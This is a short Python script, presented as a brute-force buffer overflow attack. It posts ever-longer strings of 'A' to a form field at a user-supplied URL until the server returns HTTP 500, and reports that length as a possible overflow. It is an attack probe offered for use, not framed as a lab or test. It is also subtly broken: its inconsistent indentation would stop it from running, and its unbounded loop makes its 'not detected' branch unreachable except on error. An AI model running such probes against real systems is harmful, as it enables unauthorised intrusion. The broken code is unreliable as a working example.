#Bruteforce buffer overflow attack to find length of buffer
import requests

def buffer_overflow_attack(url):
  '''Incremental buffer attempt
  1-55 = 1, 
  55-200 = 10,
  200+ =50'''
    buffer_size = 1
    found = False

    while not found:
        payload = 'A' * buffer_size
        data = {'input_field': payload}

        try:
            response = requests.post(url, data=data)
            print(f"Trying buffer size: {buffer_size}")
            
            if response.status_code == 500:
                print(f"Possible buffer overflow at size: {buffer_size}")
                found = True
            else:
                # Adjust increments based on current buffer size
                if buffer_size < 55:
                    buffer_size += 1
                elif buffer_size < 200:
                    buffer_size += 10
                else:
                    buffer_size += 50
        except Exception as e:
            print(f"Error: {e}")
            break

    if found:
        print(f"Buffer overflow detected with buffer size: {buffer_size}")
    else:
        print("Buffer overflow not detected within tested range.")

if __name__ == "__main__":
    url = input("Enter the URL of the form: ")
    buffer_overflow_attack(url)
